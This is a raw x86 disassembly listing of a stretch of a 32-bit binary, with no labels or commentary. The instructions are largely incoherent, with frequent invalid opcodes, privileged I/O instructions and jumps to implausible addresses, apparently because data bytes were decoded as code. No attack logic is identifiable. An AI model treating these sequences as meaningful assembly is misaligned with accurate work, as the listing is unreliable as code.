  40d688:	outs   dx,DWORD PTR ds:[esi]
  40d689:	test   DWORD PTR [ecx+0x39],ecx
  40d68c:	push   ss
  40d68d:	sbb    eax,0x3191b7be
  40d692:	loopne 0x40d6fb
  40d694:	inc    ebx
  40d695:	mov    ds:0xb5ac5db7,al
  40d69a:	bound  ecx,QWORD PTR [ebx-0x2c]
  40d69d:	and    dl,BYTE PTR [ebx]
  40d69f:	mov    ebp,0xdd823f7f
  40d6a4:	dec    ebx
  40d6a5:	repnz fs or al,0x1e
  40d6a9:	inc    eax
  40d6aa:	nop
  40d6ab:	icebp  
  40d6ac:	rcl    BYTE PTR [edx+esi*2],cl
  40d6af:	dec    eax
  40d6b0:	xlat   BYTE PTR ds:[ebx]
  40d6b1:	repz and al,0x3f
  40d6b4:	rcr    DWORD PTR [eax+edx*8-0x54],cl
  40d6b8:	jo     0x40d664
  40d6ba:	jns    0x40d71c
  40d6bc:	sub    DWORD PTR [edx],edi
  40d6be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6bf:	mov    bl,0x5c
  40d6c1:	dec    esp
  40d6c2:	test   al,0x84
  40d6c4:	push   eax
  40d6c5:	scas   eax,DWORD PTR es:[edi]
  40d6c6:	fcmovnbe st,st(1)
  40d6c8:	mov    edx,0x6825bb17
  40d6cd:	and    bh,al
  40d6cf:	mov    edx,0xaccd2b13
  40d6d4:	or     al,0x9a
  40d6d6:	test   DWORD PTR [ebx+0x1ee21e1],edi
  40d6dc:	mov    eax,ds:0x1b38007a
  40d6e1:	jb     0x40d69c
  40d6e3:	fsub   QWORD PTR [ebx]
  40d6e5:	shr    DWORD PTR [ebx-0x80cbb02],1
  40d6eb:	sbb    eax,0x97b00f77
  40d6f0:	cmp    ebx,DWORD PTR [edx+0x4862e201]
  40d6f6:	inc    ebp
  40d6f7:	xchg   edx,eax
  40d6f8:	mov    ebp,eax
  40d6fa:	nop
  40d6fb:	add    BYTE PTR [eax],dl
  40d6fd:	cli    
  40d6fe:	stc    
  40d6ff:	cmp    BYTE PTR [edi-0x7656bfc1],cl
  40d705:	sbb    DWORD PTR [ecx+edx*2-0x6fc67fd],ebx
  40d70c:	ins    BYTE PTR es:[edi],dx
  40d70d:	test   DWORD PTR [ecx],esp
  40d70f:	add    al,0x4b
  40d711:	mov    ss,WORD PTR [ebx]
  40d713:	inc    edi
  40d714:	mov    edx,0xc8d564cf
  40d719:	and    bl,BYTE PTR [ecx]
  40d71b:	fs cwde 
  40d71d:	add    ebx,edx
  40d71f:	xchg   edx,eax
  40d720:	out    0x63,al
  40d722:	jno    0x40d765
  40d724:	stc    
  40d725:	mov    ds:0x20cac2cb,eax
  40d72a:	mov    ds:0xfa21384b,eax
  40d72f:	fnstsw WORD PTR [ebp+0x71]
  40d732:	lea    esi,[eax]
  40d734:	adc    ch,al
  40d736:	adc    eax,DWORD PTR [esi+0x33]
  40d739:	pop    ebp
  40d73a:	or     al,0x6f
  40d73c:	xchg   ebp,eax
  40d73d:	cmp    ecx,DWORD PTR [ebp+eiz*2+0x70e69f77]
  40d744:	sbb    BYTE PTR [ebx+eax*8-0x26],ah
  40d748:	(bad)  
  40d749:	in     al,dx
  40d74a:	cmp    eax,edx
  40d74c:	repz test eax,0xa4f82955
  40d752:	lods   al,BYTE PTR ds:[esi]
  40d753:	mov    esi,0x25cfe2d8
  40d758:	jge    0x40d6fe
  40d75a:	dec    esp
  40d75b:	mov    dl,0x5c
  40d75d:	xchg   edx,eax
  40d75e:	and    al,0xdd
  40d760:	xchg   BYTE PTR [edx],dl
  40d762:	scas   al,BYTE PTR es:[edi]
  40d763:	pop    ebp
  40d764:	adc    dh,BYTE PTR [edx-0x4b]
  40d767:	nop
  40d768:	sti    
  40d769:	je     0x40d7c0
  40d76b:	mov    gs,WORD PTR [ebx-0x60]
  40d76e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d76f:	sbb    BYTE PTR [ecx+0x38763d72],al
  40d775:	xchg   esp,eax
  40d776:	ror    ah,cl
  40d778:	mov    ebx,0x88c171d8
  40d77d:	popa   
  40d77e:	sub    eax,DWORD PTR [edx+0x12]
  40d781:	cmp    esp,DWORD PTR [edi-0x4a749265]
  40d787:	jecxz  0x40d71f
  40d789:	mov    edi,0xb3157e39
  40d78e:	loope  0x40d7e0
  40d790:	xor    bl,BYTE PTR [edi-0x72d2fa53]
  40d796:	cmp    edi,esi
  40d798:	sbb    al,0xbf
  40d79a:	sbb    dh,BYTE PTR [edi+0x62]
  40d79d:	push   cs
  40d79e:	dec    ebx
  40d79f:	xchg   ebx,eax
  40d7a0:	mov    ds:0x36cf3fcb,eax
  40d7a5:	fadd   DWORD PTR [esi-0x1137de0a]
  40d7ab:	xor    BYTE PTR [edi+edi*4-0x6bed37b0],bl
  40d7b2:	into   
  40d7b3:	mov    ss,WORD PTR [eax+0x1d]
  40d7b6:	dec    esp
  40d7b7:	add    eax,0xc0418152
  40d7bc:	pop    ss
  40d7bd:	inc    edx
  40d7be:	push   ss
  40d7bf:	and    DWORD PTR fs:[ecx],0x10b7b969
  40d7c6:	arpl   WORD PTR [edx],bx
  40d7c8:	rcl    edx,0x19
  40d7cb:	dec    edi
  40d7cc:	adc    BYTE PTR [ecx+0x5d5a858b],0xb1
  40d7d3:	cmp    al,0x8
  40d7d5:	iret   
  40d7d6:	inc    eax
  40d7d7:	mov    ebx,0x221b60c6
  40d7dc:	(bad)  
  40d7dd:	or     eax,0xf7ea9749
  40d7e2:	mov    ds,WORD PTR [eax-0x9e87982]
  40d7e8:	or     cl,BYTE PTR [ecx+0xc]
  40d7eb:	in     eax,0xcd
  40d7ed:	push   esp
  40d7ee:	jo     0x40d816
  40d7f0:	push   0x70254c1e
  40d7f5:	mov    bh,0xd9
  40d7f7:	in     eax,dx
  40d7f8:	mov    cl,0x5d
  40d7fa:	mov    al,0x12
  40d7fc:	inc    ecx
  40d7fd:	adc    ebp,0x10e54ecb
  40d803:	xchg   edi,eax
  40d804:	and    al,0x3c
  40d806:	mov    cl,0x85
  40d808:	lock jmp 0x40d7af
  40d80b:	inc    eax
  40d80c:	popa   
  40d80d:	aas    
  40d80e:	enter  0x4498,0x2
  40d812:	loope  0x40d7b5
  40d814:	rcr    BYTE PTR [edi],0xa8
  40d817:	ret    
  40d818:	lea    esi,[ebx+0x25]
  40d81b:	inc    ecx
  40d81c:	jb     0x40d817
  40d81e:	cmp    edx,DWORD PTR [esi-0xdf0c83a]
  40d824:	es in  al,dx
  40d826:	push   edi
  40d827:	xchg   edi,eax
  40d828:	pop    edi
  40d829:	adc    BYTE PTR [eax+esi*2],ah
  40d82c:	les    edx,FWORD PTR [esi+0x4f]
  40d82f:	les    eax,FWORD PTR [eax+eax*8+0x35]
  40d833:	or     al,0x57
  40d835:	popf   
  40d836:	adc    al,0xba
  40d838:	mov    esi,0xe2c1c6dd
  40d83d:	push   es
  40d83e:	popf   
  40d83f:	hlt    
  40d840:	repz dec esp
  40d842:	jae    0x40d7ec
  40d844:	inc    ecx
  40d845:	stc    
  40d846:	mov    BYTE PTR [eax-0x21],cl
  40d849:	fdiv   QWORD PTR [edi-0x55]
  40d84c:	jp     0x40d845
  40d84e:	and    dl,0xb
  40d851:	test   BYTE PTR [eax+0x53cc97ce],ah
  40d857:	add    eax,0x3662d4c7
  40d85c:	lods   al,BYTE PTR ds:[esi]
  40d85d:	mov    ecx,0x5ec26ba5
  40d862:	add    dh,dl
  40d864:	mov    DWORD PTR [ecx+0x9],esi
  40d867:	mov    fs,edx
  40d869:	aam    0xe1
  40d86b:	and    dl,BYTE PTR [ebp+0x4f262aad]
  40d871:	outs   dx,BYTE PTR ds:[esi]
  40d872:	sub    al,BYTE PTR [ebp-0x8]
  40d875:	shr    BYTE PTR ds:[edx],cl
  40d878:	xor    DWORD PTR [ebp-0x4dbd1c38],eax
  40d87e:	ror    edi,cl
  40d880:	cmp    dh,BYTE PTR [edi]
  40d882:	ss ds aam 0xdb
  40d886:	or     ch,dh
  40d888:	aam    0xef
  40d88a:	in     eax,0xf0
  40d88c:	mov    ebx,0xbc2ad299
  40d891:	xchg   BYTE PTR [edx],dh
  40d893:	daa    
  40d894:	in     al,dx
  40d895:	xchg   ebx,eax
  40d896:	adc    cl,BYTE PTR [edx+edx*8+0x363e09df]
  40d89d:	out    0x45,al
  40d89f:	neg    DWORD PTR [ebp+0x59]
  40d8a2:	neg    DWORD PTR [ebx+0x43b6d308]
  40d8a8:	je     0x40d8a9
  40d8aa:	cmp    BYTE PTR [eax],cl
  40d8ac:	std    
  40d8ad:	sbb    al,dh
  40d8af:	fcom   QWORD PTR [ebp+0x5f]
  40d8b2:	mov    esp,0x34eafff3
  40d8b7:	xor    dh,al
  40d8b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8ba:	sar    DWORD PTR [eax-0xe],1
  40d8bd:	mov    ah,0xc
  40d8bf:	jns    0x40d863
  40d8c1:	push   ebp
  40d8c2:	push   ebp
  40d8c3:	push   ds
  40d8c4:	aas    
  40d8c5:	rol    BYTE PTR [edx],cl
  40d8c7:	call   0x4d79e2ce
  40d8cc:	sbb    DWORD PTR [eax-0xb3f4991],ebp
  40d8d2:	enter  0x33d2,0x84
  40d8d6:	dec    esp
  40d8d7:	add    al,0xdc
  40d8d9:	retf   0xf16e
  40d8dc:	(bad)  
  40d8dd:	dec    eax
  40d8de:	fsubr  DWORD PTR [eax]
  40d8e0:	push   edx
  40d8e1:	lahf   
  40d8e2:	repz (bad) 
  40d8e5:	mov    dh,0x3b
  40d8e7:	adc    dl,BYTE PTR [eax-0x1cf0c7d5]
  40d8ed:	dec    esp
  40d8ee:	jl     0x40d8fa
  40d8f0:	pop    ebx
  40d8f1:	nop
  40d8f2:	pop    ebp
  40d8f3:	push   esi
  40d8f4:	dec    ecx
  40d8f5:	inc    ecx
  40d8f6:	retf   
  40d8f7:	mov    edx,0x6c8ea900
  40d8fc:	push   edi
  40d8fd:	dec    ebx
  40d8fe:	pop    ecx
  40d8ff:	bound  ecx,QWORD PTR [ebx+0x1ccccff4]
  40d905:	xor    eax,0x24cfdeb0
  40d90a:	call   0xa6d8c9bd
  40d90f:	imul   edx,DWORD PTR [ecx+ebx*1-0x17182eb0],0xd1054034
  40d91a:	jg     0x40d93f
  40d91c:	rol    cl,0x2
  40d91f:	adc    DWORD PTR [ebp+0x50ddb158],0x6a
  40d926:	pop    ebx
  40d927:	xor    eax,0xcfa48f02
  40d92c:	push   0x5f
  40d92e:	scas   eax,DWORD PTR es:[edi]
  40d92f:	adc    BYTE PTR [edx+0x75],al
  40d932:	fs jecxz 0x40d918
  40d935:	and    ch,BYTE PTR [eax+0x4fd9db5]
  40d93b:	adc    edi,DWORD PTR [edx-0x27f5c57]
  40d941:	in     eax,dx
  40d942:	test   DWORD PTR [esi],esi
  40d944:	adc    dh,BYTE PTR [edi]
  40d946:	adc    al,0x86
  40d948:	pop    ebp
  40d949:	popf   
  40d94a:	pop    ds
  40d94b:	stc    
  40d94c:	jge    0x40d9a1
  40d94e:	cs (bad) 
  40d950:	fdiv   QWORD PTR [esi+0x7b0a2a30]
  40d956:	(bad)  
  40d957:	xchg   esp,eax
  40d958:	push   esp
  40d959:	js     0x40d9d3
  40d95b:	(bad)  
  40d95c:	xor    al,BYTE PTR ds:0xed5fdcf1
  40d962:	push   eax
  40d963:	repnz or al,0x3
  40d966:	outs   dx,DWORD PTR ds:[esi]
  40d967:	gs xchg esi,eax
  40d969:	jge    0x40d964
  40d96b:	ds cmp al,0x2c
  40d96e:	cmp    dh,bh
  40d970:	stc    
  40d971:	xchg   ebp,eax
  40d972:	out    dx,eax
  40d973:	jno    0x40d9c2
  40d975:	jne    0x40d991
  40d977:	(bad)
  40d97a:	push   ebx
  40d97b:	(bad)  
  40d97c:	in     al,dx
  40d97d:	sub    ch,BYTE PTR [edi+0x2b]
  40d980:	fwait
  40d981:	into   
  40d982:	jecxz  0x40d98b
  40d984:	inc    ebp
  40d985:	les    ecx,FWORD PTR [ebp-0x1ea6b8ec]
  40d98b:	mov    esi,0x8a017e92
  40d990:	pop    esi
  40d991:	dec    ebp
  40d992:	out    0xf6,al
  40d994:	ss pop ss
  40d996:	sbb    bh,cl
  40d998:	sahf   
  40d999:	mov    ds:0xb6fdd1ff,al
  40d99e:	push   esi
  40d99f:	les    edi,FWORD PTR [ecx-0x57a73c28]
  40d9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9a6:	and    BYTE PTR [edi-0x80],cl
  40d9a9:	push   ebp
  40d9aa:	sbb    dl,BYTE PTR [ecx]
  40d9ac:	test   cl,bl
  40d9ae:	push   edi
  40d9af:	ins    BYTE PTR es:[edi],dx
  40d9b0:	xor    edx,DWORD PTR [edi-0x3a]
  40d9b3:	sub    esp,ebx
  40d9b5:	outs   dx,BYTE PTR ds:[esi]
  40d9b6:	neg    BYTE PTR [ebp+0x17]
  40d9b9:	pop    esp
  40d9ba:	gs push eax
  40d9bc:	push   esi
  40d9bd:	xor    bl,BYTE PTR [edi]
  40d9bf:	cmp    DWORD PTR [ebx-0x6c],ebx
  40d9c2:	dec    BYTE PTR [edi]
  40d9c4:	gs ja  0x40d98e
  40d9c7:	sbb    dh,al
  40d9c9:	retf   
  40d9ca:	stc    
  40d9cb:	or     bl,BYTE PTR [esi+0x6e1e3057]
  40d9d1:	out    dx,al
  40d9d2:	std    
  40d9d3:	xacquire xchg BYTE PTR [esi+eiz*1],dh
  40d9d7:	sub    eax,0x749cf325
  40d9dc:	stos   BYTE PTR es:[edi],al
  40d9dd:	inc    edi
  40d9de:	jge    0x40da29
  40d9e0:	sbb    edi,0xffffffc7
  40d9e3:	push   ds
  40d9e4:	and    eax,eax
  40d9e6:	stos   DWORD PTR es:[edi],eax
  40d9e7:	jecxz  0x40d9af
  40d9e9:	jnp    0x40da15
  40d9eb:	js     0x40d9f2
  40d9ed:	xor    cl,dh
  40d9ef:	jecxz  0x40d9b6
  40d9f1:	inc    edi
  40d9f2:	cmc    
  40d9f3:	adc    ch,dl
  40d9f5:	and    ah,cl
  40d9f7:	in     eax,0x9c
  40d9f9:	cmp    DWORD PTR [ebx-0x4ce9fda6],esp
  40d9ff:	mov    al,ds:0x81d95485
  40da04:	test   eax,ebp
  40da06:	mov    cl,BYTE PTR [esi]
  40da08:	adc    bh,BYTE PTR [edi+eiz*1]
  40da0b:	sbb    DWORD PTR [ebx],0x11
  40da0e:	xchg   edi,eax
  40da0f:	sbb    BYTE PTR [eax],al
  40da11:	mov    ebx,0x2e31977d
  40da16:	sbb    esi,DWORD PTR [eax+eiz*8]
  40da19:	or     al,0xe1
  40da1b:	push   ds
  40da1c:	cmp    ah,BYTE PTR [esi-0x1f]
  40da1f:	frstor [ebx+0xcae7b63]
  40da25:	retf   0x950b
  40da28:	pop    ds
  40da29:	sar    BYTE PTR [ecx-0x1ffac714],0x3
  40da30:	mov    bl,0x70
  40da32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da33:	(bad)  
  40da34:	push   edi
  40da35:	push   ss
  40da36:	arpl   WORD PTR [esi],bx
  40da38:	retf   
  40da39:	push   0xaba2d854
  40da3e:	push   cs
  40da3f:	jnp    0x40da08
  40da41:	arpl   WORD PTR [ebx],dx
  40da43:	bound  edx,QWORD PTR [eax+0x2e]
  40da46:	test   esi,0x13faffa2
  40da4c:	and    eax,0x3f83354
  40da51:	xlat   BYTE PTR ds:[ebx]
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0x75,eax
  40da6e:	pop    es
  40da6f:	inc    ebp
  40da70:	pop    ss
  40da71:	xor    ah,BYTE PTR [edx+0x79707e7e]
  40da77:	jle    0x40daf7
  40da79:	pop    edi
  40da7a:	xchg   BYTE PTR [esi],bl
  40da7c:	call   0xcee4:0x70227c01
  40da83:	pop    ebp
  40da84:	into   
  40da85:	mov    ds:0xd9a0e4a,al
  40da8a:	jl     0x40db09
  40da8c:	cmp    eax,0x8ac6819f
  40da91:	test   BYTE PTR [edx+0x6324882d],0x7c
  40da98:	mov    edx,esp
  40da9a:	adc    eax,edx
  40da9c:	fs iret 
  40da9e:	outs   dx,DWORD PTR ds:[esi]
  40da9f:	popa   
  40daa0:	dec    ebx
  40daa1:	les    ecx,FWORD PTR [ebx+0xd]
  40daa4:	pop    ebx
  40daa5:	ds inc eax
  40daa7:	bound  edx,QWORD PTR [eax-0x7b2c2484]
  40daad:	mov    edi,0x817acba1
  40dab2:	cmp    DWORD PTR [ebx+0x7a789479],edi
  40dab8:	(bad)  
  40dab9:	lods   eax,DWORD PTR ds:[esi]
  40daba:	sub    BYTE PTR [edx-0x35],ah
  40dabd:	mov    ds:0xfa973517,eax
  40dac2:	cmp    BYTE PTR [edx+edx*1-0x3ee995df],ch
  40dac9:	adc    al,0x7c
  40dacb:	into   
  40dacc:	push   0xffffff89
  40dace:	or     WORD PTR ss:[ebp+0x4d],ax
  40dad3:	frstor [eax]
  40dad5:	pop    ebx
  40dad6:	push   eax
  40dad7:	jno    0x40da5b
  40dad9:	mov    BYTE PTR [esi+0x54607dd4],dl
  40dadf:	clc    
  40dae0:	inc    DWORD PTR [edx]
  40dae2:	ins    BYTE PTR es:[edi],dx
  40dae3:	sub    BYTE PTR [edi+0x70d4b4cd],dl
  40dae9:	sub    DWORD PTR [ecx],esi
  40daeb:	std    
  40daec:	dec    ecx
  40daed:	pop    ecx
  40daee:	add    bl,BYTE PTR [ebx+0x3e]
  40daf1:	sub    eax,ecx
  40daf3:	out    dx,eax
  40daf4:	push   DWORD PTR [edi-0x54]
  40daf7:	stos   DWORD PTR es:[edi],eax
  40daf8:	cmp    eax,0xfe26202d
  40dafd:	pop    ecx
  40dafe:	outs   dx,DWORD PTR ds:[esi]
  40daff:	sbb    DWORD PTR [ebx+0x3f9578de],ebp
  40db05:	cmc    
  40db06:	xor    bl,BYTE PTR [esi-0x2]
  40db09:	and    esp,esp
  40db0b:	cmp    BYTE PTR [ecx],0x5e
  40db0e:	idiv   esi
  40db10:	push   ebp
  40db11:	mov    dl,0xcb
  40db14:	lea    edi,[esi]
  40db16:	arpl   WORD PTR [ebp-0x37],ax
  40db19:	out    dx,eax
  40db1a:	sub    bl,BYTE PTR [edi]
  40db1c:	adc    eax,0x6e2e9a66
  40db21:	(bad)  
  40db22:	fiadd  WORD PTR [eax+0x5865e606]
  40db28:	sbb    al,0xd8
  40db2a:	push   eax
  40db2b:	jp     0x40db11
  40db2d:	push   edx
  40db2e:	sub    al,dh
  40db30:	mov    eax,0x2f592d99
  40db35:	jmp    0x40dad8
  40db37:	or     esi,DWORD PTR ds:0xaf9f62c7
  40db3d:	mov    eax,0xb4ccc6f4
  40db42:	jb     0x40db5b
  40db44:	rcl    DWORD PTR [eax],1
  40db46:	stos   BYTE PTR es:[edi],al
  40db47:	push   edi
  40db48:	xchg   ebp,eax
  40db49:	dec    esi
  40db4a:	fwait
  40db4b:	nop
  40db4c:	cmp    dh,BYTE PTR [edx-0x1b9fc496]
  40db52:	test   al,0xd4
  40db54:	shr    BYTE PTR [eax],cl
  40db56:	addr16 adc eax,0xadd861ba
  40db5c:	ret    0xaff4
  40db5f:	push   esi
  40db60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db61:	xchg   edx,eax
  40db62:	rol    DWORD PTR [edi],1
  40db64:	or     eax,0x33b3dd3f
  40db69:	imul   esi,eax,0xacb3c63
  40db6f:	retf   0xe995
  40db72:	ret    0xb7ce
  40db75:	in     eax,dx
  40db76:	add    BYTE PTR [ebx-0x4f],cl
  40db79:	jne    0x40dbca
  40db7b:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40db7d:	and    DWORD PTR [esi+0x1c],esp
  40db80:	sbb    dh,BYTE PTR [edx+0x6e]
  40db83:	sbb    BYTE PTR [ecx],bh
  40db85:	add    eax,ebx
  40db87:	push   ds
  40db88:	scas   al,BYTE PTR es:[edi]
  40db89:	xor    eax,0x9e3b60d3
  40db8e:	loop   0x40dba6
  40db90:	jne    0x40db6d
  40db92:	push   ebp
  40db93:	mov    dh,0xaf
  40db95:	or     al,0x6d
  40db97:	shr    DWORD PTR [edx-0x49fdd429],0x7c
  40db9e:	xor    BYTE PTR [ebp+0x66],bl
  40dba1:	(bad)  
  40dba2:	(bad)  
  40dba3:	js     0x40dba9
  40dba5:	nop
  40dba6:	dec    ebx
  40dba7:	mul    BYTE PTR [ebp-0x14da78fe]
  40dbad:	fst    DWORD PTR [ebx+0x4baa825]
  40dbb3:	lods   al,BYTE PTR ds:[esi]
  40dbb4:	cmp    al,0x19
  40dbb6:	(bad)  
  40dbb7:	addr16 aam 0xb0
  40dbba:	adc    bl,BYTE PTR [edx-0x45]
  40dbbd:	adc    esi,0xf8734d3
  40dbc3:	test   bl,ah
  40dbc5:	mov    eax,ds:0x5d58a4b4
  40dbca:	sbb    DWORD PTR [ecx+0x7f28f18d],edi
  40dbd0:	addr16 push edi
  40dbd2:	lahf   
  40dbd3:	pop    DWORD PTR [esi+eiz*1-0x69]
  40dbd7:	(bad)  
  40dbd8:	cmp    bh,BYTE PTR [ebp+0x22]
  40dbdb:	sbb    eax,0x2596e84c
  40dbe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbe1:	mov    ch,0xa5
  40dbe3:	sub    DWORD PTR [ebx],esi
  40dbe5:	add    al,0xad
  40dbe7:	xchg   ebx,eax
  40dbe8:	pop    eax
  40dbe9:	enter  0xb6cf,0x73
  40dbed:	push   eax
  40dbee:	ins    DWORD PTR es:[edi],dx
  40dbef:	xor    ah,bl
  40dbf1:	in     eax,0xdc
  40dbf3:	push   esp
  40dbf4:	xor    eax,0x4cfbb02
  40dbf9:	inc    DWORD PTR [esi-0x3a]
  40dbfc:	adc    DWORD PTR [ebx-0x34],edi
  40dbff:	jns    0x40db93
  40dc01:	std    
  40dc02:	or     eax,0xa73855d3
  40dc07:	js     0x40dc29
  40dc09:	dec    esp
  40dc0a:	xchg   esi,eax
  40dc0b:	stos   DWORD PTR es:[edi],eax
  40dc0c:	adc    eax,0xc22de0af
  40dc11:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40dc13:	pop    ebx
  40dc14:	push   ebp
  40dc15:	fsub   DWORD PTR [eax+0x53570168]
  40dc1b:	imul   ecx,DWORD PTR ds:0x167e5b41,0xffffffad
  40dc22:	daa    
  40dc23:	(bad)  
  40dc24:	cdq    
  40dc25:	mov    ebx,0x78cb7b54
  40dc2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc2b:	xchg   edx,eax
  40dc2c:	sub    eax,DWORD PTR [edi+0x1a]
  40dc2f:	lods   al,BYTE PTR ds:[esi]
  40dc30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc31:	xchg   BYTE PTR [ebx+0x0],bh
  40dc34:	sbb    BYTE PTR [eax-0xa],ah
  40dc37:	xchg   ebx,eax
  40dc38:	lods   eax,DWORD PTR ds:[esi]
  40dc39:	add    BYTE PTR [esi+0x34553582],bl
  40dc3f:	(bad)  
  40dc40:	jecxz  0x40dc6e
  40dc42:	adc    al,0x1
  40dc44:	xor    ah,BYTE PTR [ecx+0x3a]
  40dc47:	push   ebp
  40dc48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc49:	(bad)  
  40dc4a:	test   DWORD PTR [ebp+0x2d],0x958ffb09
  40dc51:	stos   BYTE PTR es:[edi],al
  40dc52:	ins    DWORD PTR es:[edi],dx
  40dc53:	sahf   
  40dc54:	mov    dl,0x92
  40dc56:	ins    DWORD PTR es:[edi],dx
  40dc57:	xchg   edi,eax
  40dc58:	jmp    0x8100414c
  40dc5d:	pop    es
  40dc5e:	xchg   DWORD PTR [ecx+0x5d5c8630],ebx
  40dc64:	jno    0x40dc29
  40dc66:	inc    ecx
  40dc67:	xchg   esp,eax
  40dc68:	test   BYTE PTR [ecx+0x74b1cf09],bl
  40dc6e:	mov    edi,DWORD PTR [ebp-0x3e689cc6]
  40dc74:	dec    ebx
  40dc75:	pop    edi
  40dc76:	popf   
  40dc77:	and    BYTE PTR [ebp-0x78],dl
  40dc7a:	out    dx,al
  40dc7b:	(bad)  
  40dc7c:	rcr    cl,cl
  40dc7e:	sub    esp,DWORD PTR [edx-0x7315cb19]
  40dc84:	repnz mov dl,al
  40dc87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc88:	fisubr WORD PTR [edi]
  40dc8a:	outs   dx,DWORD PTR ds:[esi]
  40dc8b:	jecxz  0x40dced
  40dc8d:	and    BYTE PTR [esi-0x46cf6cf2],dh
  40dc93:	jae    0x40dc81
  40dc95:	xor    bl,BYTE PTR [edi]
  40dc97:	pop    es
  40dc98:	test   DWORD PTR [edi+edi*1+0x48],ebp
  40dc9c:	mov    ch,0x3a
  40dc9e:	fcom   st(2)
  40dca0:	push   cs
  40dca1:	mov    ch,0x91
  40dca3:	ds aaa 
  40dca5:	sub    BYTE PTR [edi],dl
  40dca7:	sub    dl,BYTE PTR [ebx]
  40dca9:	test   al,0xf1
  40dcab:	fimul  DWORD PTR [ecx-0x31]
  40dcae:	ret    0x166d
  40dcb1:	dec    eax
  40dcb2:	sbb    eax,0xc8a270b7
  40dcb7:	mov    cl,0xd4
  40dcb9:	mov    ch,0xf4
  40dcbb:	hlt    
  40dcbc:	xchg   edx,eax
  40dcbd:	cld    
  40dcbe:	inc    esp
  40dcbf:	xor    BYTE PTR [esi+0x3cc8d7df],bh
  40dcc5:	jl     0x40dd3c
  40dcc7:	xchg   DWORD PTR [edi],ecx
  40dcc9:	push   ebp
  40dcca:	xor    ah,BYTE PTR [edx+0x451964bd]
  40dcd0:	jmp    0xb7023167
  40dcd5:	mov    ds:0x1b75dad3,al
  40dcda:	ins    DWORD PTR es:[edi],dx
  40dcdb:	inc    edi
  40dcdc:	mov    dl,0x8a
  40dcde:	add    BYTE PTR [edx+0x0],0xb8
  40dce2:	gs (bad) 
  40dce4:	or     dl,al
  40dce6:	aad    0xa0
  40dce8:	xchg   dh,al
  40dcea:	xchg   ecx,eax
  40dceb:	cwde   
  40dcec:	mov    dh,0x32
  40dcee:	rcr    DWORD PTR [ecx],0x20
  40dcf1:	push   esp
  40dcf2:	push   ss
  40dcf3:	inc    edx
  40dcf4:	(bad)  
  40dcf5:	lods   al,BYTE PTR ds:[esi]
  40dcf6:	adc    al,0x98
  40dcf8:	push   ebx
  40dcf9:	test   DWORD PTR ss:[ebp+0x4b],eax
  40dcfd:	bnd jae 0x40dd7a
  40dd00:	lock loop 0x40dcb8
  40dd03:	loopne 0x40dcc5
  40dd05:	(bad)  
  40dd06:	fsubrp st(2),st
  40dd08:	push   edx
  40dd09:	xchg   ecx,eax
  40dd0a:	cs pop es
  40dd0c:	mov    bh,0x9c
  40dd0e:	enter  0xf7cd,0xa
  40dd12:	cmp    eax,0x4aa53804
  40dd17:	in     al,0x96
  40dd19:	retf   
  40dd1a:	cmp    edi,esp
  40dd1c:	test   BYTE PTR [eax-0x39],dl
  40dd1f:	in     eax,dx
  40dd20:	shr    DWORD PTR [ebx-0xf],cl
  40dd23:	pop    ebx
  40dd24:	mov    edi,0xb737a293
  40dd29:	data16 neg bl
  40dd2c:	push   ebp
  40dd2d:	int    0x4b
  40dd2f:	xor    cl,BYTE PTR [esp+ebx*1]
  40dd32:	cli    
  40dd33:	adc    eax,0x27f619b4
  40dd38:	mov    ds:0xfd9c57ed,al
  40dd3d:	lods   al,BYTE PTR ds:[esi]
  40dd3e:	jne    0x40ddad
  40dd40:	xchg   ecx,eax
  40dd41:	cmp    ebx,DWORD PTR ds:0xfec5af96
  40dd47:	jecxz  0x40dce4
  40dd49:	xchg   edx,eax
  40dd4a:	mov    edx,0x42f713a7
  40dd4f:	loopne 0x40dd56
  40dd51:	rcr    BYTE PTR [ebx],1
  40dd53:	fldenv [edx+edx*2-0x78c40d4b]
  40dd5a:	in     al,0xcc
  40dd5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd5d:	inc    edi
  40dd5e:	inc    ebp
  40dd5f:	push   ebp
  40dd60:	and    DWORD PTR [bp+si],esp
  40dd63:	js     0x40dd9e
  40dd65:	adc    al,0x8
  40dd67:	aaa    
  40dd68:	sbb    eax,0x404758fb
  40dd6d:	(bad)
  40dd70:	xor    al,0xb5
  40dd72:	fild   WORD PTR [ecx]
  40dd74:	ret    0x361c
  40dd77:	mov    ebp,0x7e54bafa
  40dd7c:	stos   DWORD PTR es:[edi],eax
  40dd7d:	repnz xor esp,edx
  40dd80:	sbb    ebx,DWORD PTR [esi]
  40dd82:	imul   eax,DWORD PTR [esi+0x525a9134],0x71bb38b9
  40dd8c:	bound  ebx,QWORD PTR [esi-0x2b]
  40dd8f:	je     0x40dddb
  40dd91:	xchg   esp,eax
  40dd92:	pusha  
  40dd93:	test   BYTE PTR ds:0x4362dd03,ah
  40dd99:	fnop   
  40dd9b:	cwde   
  40dd9c:	int    0x36
  40dd9e:	sub    eax,0x771d9fe3
  40dda3:	fadd   DWORD PTR [ecx+ebx*8+0x10]
  40dda7:	mov    edi,0x21f9d52c
  40ddac:	das    
  40ddad:	dec    ebx
  40ddae:	sbb    dl,bh
  40ddb0:	fyl2x  
  40ddb2:	fild   WORD PTR [edi-0x28ad201b]
  40ddb8:	push   eax
  40ddb9:	or     ebp,DWORD PTR [esi]
